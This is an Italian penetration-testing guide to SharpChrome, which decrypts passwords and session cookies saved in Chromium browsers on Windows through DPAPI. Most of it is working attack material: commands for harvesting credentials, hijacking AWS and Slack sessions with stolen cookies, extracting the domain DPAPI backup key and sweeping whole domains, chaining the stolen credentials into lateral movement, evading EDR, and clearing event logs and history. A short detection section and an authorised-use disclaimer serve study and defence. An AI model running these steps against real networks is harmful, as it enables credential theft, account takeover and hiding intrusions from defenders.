---
title: 'SharpChrome: Dump Credenziali Browser da Windows (DPAPI Abuse)'
slug: sharpchrome
description: 'SharpChrome: Dump Credenziali Browser da Windows (DPAPI Abuse)'
image: /Gemini_Generated_Image_6ez9mm6ez9mm6ez9.webp
draft: false
date: 2026-02-25T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - dpapi
  - >-
    SharpChrome estrae password e cookie salvati in Google Chrome su Windows
    sfruttando DPAPI. Tool chiave per credential access in post-exploitation.
---

SharpChrome è un tool C# sviluppato dal team GhostPack che estrae password salvate e cookie di sessione da browser Chromium-based (Chrome, Edge, Brave, Slack) attraverso decryption DPAPI dei database SQLite locali. Il tool gestisce nativamente l'encryption AES-GCM introdotta in Chrome v80+ e implementa accesso lockless per leggere i database anche con browser aperto.

Durante engagement di penetration testing, SharpChrome permette di raccogliere credenziali per servizi cloud, applicazioni web enterprise e piattaforme SaaS salvate nei browser degli utenti compromessi. Il tool si posiziona nella fase **Credential Access** (MITRE ATT\&CK T1555.003) della kill chain, tipicamente dopo aver ottenuto accesso iniziale e prima di lateral movement verso target di valore.

In questa guida impari a usare SharpChrome per harvesting massivo di credenziali browser, session hijacking tramite cookie theft, exploitation della domain DPAPI backup key per triage multi-workstation, e integrazione con [SharpDPAPI](https://hackita.it/articoli/sharpdpapi) per operazioni su scala enterprise.

## Setup e Installazione

**Repository ufficiale:** [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
**Versione corrente:** v1.9.0

### Compilazione da Source

**Requisiti:**

* Visual Studio 2015+
* .NET Framework 3.5+ sul target Windows
* Git

```bash
git clone https://github.com/GhostPack/SharpDPAPI.git
cd SharpDPAPI/SharpChrome
```

Apri `SharpChrome.sln` in Visual Studio → Build → Configuration: Release → Platform: x64 → Build Solution

**Output:** `SharpChrome\bin\Release\SharpChrome.exe` (\~45 KB)

### Verifica Funzionamento

```cmd
C:\Tools> SharpChrome.exe

  __                 ___ _                          
 (_  |_   _.  _ ._  / / |_) ._ _  ._ _   _  
 __) | | (_| |_)|_) \ \ | \ | (_) | | | (/_ 
              |                            

  SharpChrome 1.9.0

Usage:
    SharpChrome.exe logins [/browser:BROWSER] [/pvk:KEY]
    SharpChrome.exe cookies [/cookie:NAME] [/url:URL]
```

## Uso Base

### Estrazione Password

```cmd
# Chrome default
SharpChrome.exe logins

# Edge
SharpChrome.exe logins /browser:edge

# Brave
SharpChrome.exe logins /browser:brave
```

**Output:**

```
[*] Searching for Chrome Login Data...
[*] Found: C:\Users\mario\AppData\Local\Google\Chrome\User Data\Default\Login Data

--- Chrome Logins (5 total) ---

URL         : https://mail.google.com
Username    : mario.rossi@azienda.it
Password    : MailPass2024!

URL         : https://portal.azienda.local
Username    : m.rossi
Password    : Inverno2024!
```

### Cookie Extraction

```cmd
SharpChrome.exe cookies /url:github.com
SharpChrome.exe cookies /cookie:session_id /url:portal.local
```

### Parametri Chiave

| Parametro          | Funzione                   |
| ------------------ | -------------------------- |
| `logins`           | Estrae password salvate    |
| `cookies`          | Estrae cookie browser      |
| `/browser:BROWSER` | chrome, edge, brave, slack |
| `/pvk:FILE`        | Domain DPAPI backup key    |
| `/cookie:NAME`     | Filtra per nome cookie     |
| `/url:DOMAIN`      | Filtra per dominio         |
| `/format:json`     | Output JSON                |

## Tecniche Operative

### Chrome AES-GCM Encryption

Da Chrome v80, Google usa AES-256-GCM per le password. SharpChrome:

1. Legge `Local State` per `encrypted_key`
2. Decrypta via DPAPI → chiave AES
3. Usa chiave per decrypt password AES-GCM

**Percorso:** `C:\Users\[USER]\AppData\Local\Google\Chrome\User Data\Local State`

### Session Hijacking

```cmd
# Estrai cookie AWS
SharpChrome.exe cookies /url:console.aws.amazon.com /cookie:aws-creds
```

**Injection:**

```javascript
// Browser DevTools (F12)
document.cookie = "aws-creds=eyJhbGci...";
location.reload();
```

### Lockless Database Access

SharpChrome crea copia temp del database SQLite per bypassare lock quando Chrome è aperto → estrazione senza chiudere browser.

## Tecniche Avanzate

### Domain DPAPI Backup Key

La backup key DPAPI del dominio **non scade mai**. Con Domain Admin privileges:

```cmd
# Estrazione (su DC)
SharpDPAPI.exe backupkey /server:DC01.corp.local /file:backup.pvk

# Uso con SharpChrome remoto
SharpChrome.exe logins /pvk:backup.pvk /server:WKSTN-042
```

Decrypta masterkey di **qualsiasi utente dominio** → triage massivo senza essere logged in come target user.

### Mass Harvesting

```powershell
# Enumera workstation attive
$targets = Get-ADComputer -Filter {Enabled -eq $true} | 
           Where {Test-Connection -Count 1 -Quiet $_} |
           Select -ExpandProperty Name

# Loop extraction
foreach ($pc in $targets) {
    SharpChrome.exe logins /pvk:backup.pvk /server:$pc >> harvest.txt
}
```

**Timeline:** \~10 secondi per workstation. 100 target = 15-20 minuti.

### Slack Token Extraction

```cmd
SharpChrome.exe cookies /browser:slack /url:app.slack.com /cookie:d
```

Token `d` (xoxd-...) → accesso completo workspace Slack via API.

**Validazione:**

```bash
curl -H "Cookie: d=xoxd-..." https://slack.com/api/auth.test
```

## Scenari Pratici

### Scenario 1: Post-Compromise Credential Harvest

**Contesto:** Shell su workstation utente standard.
**Timeline:** 2-3 minuti

**Comando:**

```cmd
upload SharpChrome.exe C:\Users\Public\sc.exe
shell C:\Users\Public\sc.exe logins
```

**Output atteso:**

```
[*] Triaging Logins for current user

--- Chrome Logins (8 total) ---

URL: https://mail.office365.com | User: mario@azienda.it | Pass: Office365!
URL: https://portal.hr.local | User: m.rossi | Pass: HRPass2024
URL: https://jira.azienda.local | User: mrossi | Pass: Jira!2024
URL: https://vpn.azienda.it | User: mario.rossi | Pass: VPN_Access123
```

**Cosa fare se fallisce:**

* **"Login Data file not found"**: Chrome non installato → prova `/browser:edge`
* **"DPAPI failed"**: Non sei nel contesto utente → usa `runas /user:DOMAIN\user cmd`
* **Output vuoto**: Utente non salva password → estrai cookie invece

### Scenario 2: AWS Console Hijacking

**Contesto:** Target usa AWS, vuoi session hijacking.
**Timeline:** 1-2 minuti

**Comando:**

```cmd
SharpChrome.exe cookies /url:console.aws.amazon.com /cookie:aws-creds
```

**Output:**

```
Name    : aws-creds  
Value   : eyJhbGciOiJIUzI1NiIsInR...
Expires : 2025-02-15 20:00:00
```

**Exploitation:**

```bash
curl -H "Cookie: aws-creds=eyJhbGci..." https://console.aws.amazon.com/ec2/
```

**Cosa fare se fallisce:**

* **Cookie scaduto**: Attendi nuova sessione utente
* **IP validation**: Proxy via workstation compromessa
* **HttpOnly cookie**: Usa Puppeteer per browser automation

### Scenario 3: Domain-Wide Sweep

**Contesto:** Domain Admin, vuoi credenziali da tutta la rete.
**Timeline:** 20-30 minuti per 150 workstation

**Step 1 - Backup key:**

```cmd
SharpDPAPI.exe backupkey /server:DC01 /file:C:\Temp\backup.pvk
```

**Step 2 - Enumeration:**

```powershell
$active = Get-ADComputer -Filter {Enabled -eq $true} |
          Where {Test-Connection -Count 1 -Quiet $_} |
          Select -ExpandProperty Name

$active | Out-File targets.txt
```

**Step 3 - Mass extraction:**

```powershell
foreach ($pc in Get-Content targets.txt) {
    Write-Host "[*] $pc"
    SharpChrome.exe logins /pvk:backup.pvk /server:$pc | Out-File -Append harvest.txt
}
```

**Step 4 - Aggregation:**

```powershell
Select-String "Password" harvest.txt | 
  Group-Object | Sort Count -Desc | Select -First 10
```

**Output:**

```
Count Name
----- ----
   18 Winter2024!
   12 Azienda123
    9 Password2024
```

**Cosa fare se fallisce:**

* **Access Denied**: Firewall blocca SMB → usa PSRemoting
* **Lento**: Parallelizza con `-Parallel -ThrottleLimit 20`
* **Alcune workstation fail**: Normale, continua con altre

## Toolchain Integration

### Flusso Credential Access

```
SharpDPAPI (backup key) → SharpChrome (browser creds) → CrackMapExec (validation) → Lateral Movement
```

**Passaggio dati:**

```bash
# 1. Backup key
SharpDPAPI.exe backupkey /server:DC01 /file:key.pvk

# 2. Mass harvest
SharpChrome.exe logins /pvk:key.pvk /server:WKSTN* > all.txt

# 3. Parse user:pass
grep "Username\|Password" all.txt | paste - - | awk -F: '{print $2":"$4}' > creds.txt

# 4. Validate
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt

# 5. Lateral movement
psexec.py DOMAIN/user:pass@target
```

### SharpChrome vs LaZagne

| Feature                | SharpChrome                | LaZagne                      |
| ---------------------- | -------------------------- | ---------------------------- |
| **Linguaggio**         | C#                         | Python                       |
| **Size**               | 45 KB                      | \~15 MB                      |
| **Browser**            | Chrome, Edge, Brave, Slack | 25+ browser                  |
| **App non-browser**    | No                         | Sì (Outlook, FileZilla, etc) |
| **Domain backup key**  | Sì (`/pvk:`)               | No                           |
| **Remote triage**      | Sì (`/server:`)            | No                           |
| **AES-GCM Chrome 80+** | Sì                         | Sì                           |
| **Lockless**           | Sì                         | No                           |
| **Cobalt Strike**      | execute-assembly           | Dependency hell              |
| **EDR detection**      | Medio                      | Alto                         |

**Quando usare SharpChrome:**

* Hai domain backup key
* Vuoi remote triage
* C2 deployment .NET
* Solo browser Chromium

**Quando usare LaZagne:**

* Coverage multipla (Firefox, apps)
* Estrazione locale completa
* No backup key

### Cobalt Strike Integration

```bash
beacon> upload /opt/SharpChrome.exe
beacon> execute-assembly SharpChrome.exe logins
beacon> execute-assembly SharpChrome.exe logins /pvk:backup.pvk
```

Execute-assembly → in-memory, no process creation.

### Impacket Integration

```bash
# Estrai creds
SharpChrome.exe logins > creds.txt

# Parse
grep "Username\|Password" creds.txt | paste - - | awk '{print $2":"$4}' > formatted.txt

# Lateral movement
while IFS=: read user pass; do
    psexec.py "CORP/$user:$pass@192.168.1.100" whoami
done < formatted.txt
```

## Attack Chain Completa

### Phishing → Domain Admin (3-5 ore)

**Fase 1: Initial Access (T+0)**

Phishing macro VBA → Meterpreter shell

**Fase 2: Local Harvest (T+10min)**

```bash
meterpreter> upload SharpChrome.exe
meterpreter> execute -f SharpChrome.exe -a "logins"
```

**Credenziali trovate:**

```
URL: https://admin.azienda.local | User: it.admin | Pass: ITAdmin2024!
URL: https://vcenter.local | User: administrator@vsphere | Pass: VMware123!
```

**Fase 3: Privilege Escalation (T+25min)**

```bash
crackmapexec smb 192.168.1.0/24 -u it.admin -p ITAdmin2024! --continue-on-success

# Hit su MGMT server
SMB 192.168.1.20 MGMT-01 [+] CORP\it.admin:ITAdmin2024! (Pwn3d!)
```

**Fase 4: Lateral to DC (T+40min)**

```bash
psexec.py CORP/it.admin:ITAdmin2024!@192.168.1.20

C:\> SharpChrome.exe logins
```

**Credenziali DA:**

```
URL: https://dc01.corp.local | User: Administrator | Pass: DomainAdmin2024!
```

**Fase 5: Domain Compromise (T+1h)**

```bash
psexec.py CORP/Administrator:DomainAdmin2024!@DC01

C:\> SharpDPAPI.exe backupkey /file:backup.pvk
C:\> mimikatz.exe "lsadump::dcsync /user:Administrator" exit
```

**Fase 6: Mass Harvest (T+1h 30min)**

```powershell
$all = Get-ADComputer -Filter * | Select -ExpandProperty Name

foreach ($pc in $all) {
    SharpChrome.exe logins /pvk:backup.pvk /server:$pc >> harvest_all.txt
}
```

**Risultato:** Dominio compromesso + 400+ credenziali browser.

## Detection & Evasion

### Blue Team Monitoring

**Event ID rilevanti:**

| Event ID | Log      | Indicatore                                  |
| -------- | -------- | ------------------------------------------- |
| 4663     | Security | Accesso `Login Data` da non-browser         |
| 11       | Sysmon   | File `chrome_temp_*.db` in %TEMP%           |
| 10       | Sysmon   | Process access a chrome.exe per memory read |

**Sysmon rule:**

```xml
<FileCreate onmatch="include">
  <TargetFilename condition="contains">Login Data</TargetFilename>
  <Image condition="not contains">chrome.exe</Image>
</FileCreate>
```

**EDR alert (Defender):**

```
Alert: Suspicious credential access
Process: SharpChrome.exe accessed browser credential database
MITRE: T1555.003
Severity: High
```

### Tecniche Evasion

**1. Process Name Spoofing**

```bash
copy SharpChrome.exe chrome_updater.exe
chrome_updater.exe logins
```

**2. In-Memory via C2**

```bash
beacon> execute-assembly SharpChrome.exe logins
```

No disk write, riduce telemetry.

**3. Delayed Execution**

```powershell
schtasks /create /tn "Update" /tr "C:\Temp\sc.exe logins > C:\Temp\out.txt" /sc once /st 03:00
```

Esecuzione notturna quando SOC ha meno analisti.

### Cleanup

```cmd
del /f /q C:\Users\Public\SharpChrome.exe
del /f /q C:\Temp\*.txt
del /f /q C:\Temp\chrome_temp_*.db
wevtutil cl "Windows PowerShell"
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

## Performance & Scaling

### Single Target

* **Tempo:** 2-4 secondi
* **CPU:** \<5%
* **Memory:** \~25 MB
* **Disk I/O:** 5-10 MB read

### Multi-Target (100 workstation)

| Metodo                      | Tempo     | Parallelismo   |
| --------------------------- | --------- | -------------- |
| Sequential                  | 15-20 min | 1 thread       |
| Parallel (ThrottleLimit 20) | 3-5 min   | 20 threads     |
| Distributed                 | 1-2 min   | Multiple hosts |

**Sequential:**

```powershell
Measure-Command {
    Get-Content targets.txt | ForEach-Object {
        SharpChrome.exe logins /pvk:key.pvk /server:$_
    }
}
# Output: 18.4 minutes
```

**Parallel:**

```powershell
Measure-Command {
    Get-Content targets.txt | ForEach-Object -Parallel {
        SharpChrome.exe logins /pvk:key.pvk /server:$_
    } -ThrottleLimit 20
}
# Output: 3.7 minutes
```

### Network Bandwidth

* Per workstation: \~60-210 KB
* 100 parallel (ThrottleLimit 20): \~4-8 MB/s peak
* 1000 workstation parallel: \~20-30 min, 20-40 MB/s

## Troubleshooting

### "Login Data file not found"

**Causa:** Chrome non installato.

**Fix:**

```cmd
dir "%LOCALAPPDATA%\Google\Chrome"
dir "%LOCALAPPDATA%\Microsoft\Edge"
```

Prova `/browser:edge` se Chrome assente.

### "DPAPI decryption failed"

**Causa:** Contesto utente sbagliato.

**Fix:**

```cmd
# RunAs
runas /user:CORP\targetuser cmd

# Oppure usa backup key
SharpDPAPI.exe backupkey /file:key.pvk
SharpChrome.exe logins /pvk:key.pvk
```

### "Access Denied" (Remote)

**Causa:** Firewall blocca SMB.

**Fix:**

```powershell
# Test SMB
Test-NetConnection -ComputerName TARGET -Port 445

# Usa PSRemoting
Invoke-Command -ComputerName TARGET -ScriptBlock {
    C:\Temp\SharpChrome.exe logins
}
```

### Output Vuoto

**Causa:** Utente non salva password.

**Fix:**

```cmd
# Prova cookie invece
SharpChrome.exe cookies /url:portal.local

# Oppure LaZagne per coverage più ampia
lazagne.exe all
```

### Browser Locked

**Causa:** Chrome aperto, database locked.

**Fix:**

SharpChrome gestisce automaticamente con copia temp. Se fallisce:

```cmd
taskkill /F /IM chrome.exe
SharpChrome.exe logins
start chrome.exe
```

## FAQ

**SharpChrome funziona con Firefox?**

No. Solo Chromium-based. Per Firefox usa [LaZagne](https://hackita.it/articoli/lazagne) o `firefox_decrypt.py`.

**La backup key DPAPI scade?**

No. Generata alla creazione dominio, valida indefinitamente.

**SharpChrome bypassa Credential Guard?**

No, ma Credential Guard protegge LSASS, non browser. SharpChrome legge database Chrome protetti solo da DPAPI user-level.

**Estrazione senza backup key?**

No, serve backup key o password utente. DPAPI masterkey derivato da password utente.

**Detection EDR?**

Sì, binario stock ha detection medio-alto (2025). Defender, CrowdStrike, SentinelOne rilevano behavioral patterns. Evasion: obfuscation, execute-assembly, custom build.

**Differenza `/pvk:` vs `/mkfile:`?**

`/pvk:` = domain backup key (decrypta qualsiasi utente). `/mkfile:` = user masterkey (solo quell'utente). Backup key per DA, masterkey per single user.

**Validare cookie rubati?**

```bash
curl -H "Cookie: session_id=ABC..." https://target.com/api/whoami
# 200 + user info = valido
# 401/403 = scaduto
```

## Cheat Sheet

| Comando                                               | Descrizione           |
| ----------------------------------------------------- | --------------------- |
| `SharpChrome.exe logins`                              | Password Chrome       |
| `SharpChrome.exe logins /browser:edge`                | Password Edge         |
| `SharpChrome.exe logins /browser:brave`               | Password Brave        |
| `SharpChrome.exe cookies /url:github.com`             | Cookie per dominio    |
| `SharpChrome.exe cookies /cookie:session`             | Cookie specifico      |
| `SharpChrome.exe logins /pvk:backup.pvk`              | Con domain backup key |
| `SharpChrome.exe logins /pvk:key.pvk /server:WKSTN01` | Remote triage         |
| `SharpChrome.exe cookies /format:json`                | Output JSON           |

**Workflow post-compromise:**

```bash
# 1. Local
SharpChrome.exe logins > creds.txt

# 2. Escalate to DA
# [privesc phase]

# 3. Backup key
SharpDPAPI.exe backupkey /server:DC01 /file:backup.pvk

# 4. Mass harvest
foreach ($pc in $targets) {
    SharpChrome.exe logins /pvk:backup.pvk /server:$pc
}

# 5. Lateral movement
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
```

***

**Disclaimer:** SharpChrome è tool di penetration testing per uso esclusivamente in ambienti autorizzati. L'utilizzo non autorizzato costituisce reato penale. Usa solo su infrastrutture di tua proprietà o con consenso scritto. Repository: [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
